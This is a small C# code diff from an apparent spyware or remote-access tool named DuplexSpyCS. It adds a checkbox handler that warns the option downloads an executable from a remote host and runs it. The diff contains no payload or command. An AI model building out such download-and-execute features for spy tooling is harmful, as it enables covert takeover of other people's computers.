@@ -150,5 +150,13 @@ namespace DuplexSpyCS
         {
             new frmBoxHelper("Function\\MultiURL").Show();
         }
+
+        private void checkBox1_CheckedChanged(object sender, EventArgs e)
+        {
+            if (checkBox1.Checked)
+            {
+                MessageBox.Show("This is used for downloading an executable from remote host on the disk and execute it.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+            }
+        }
     }
 }
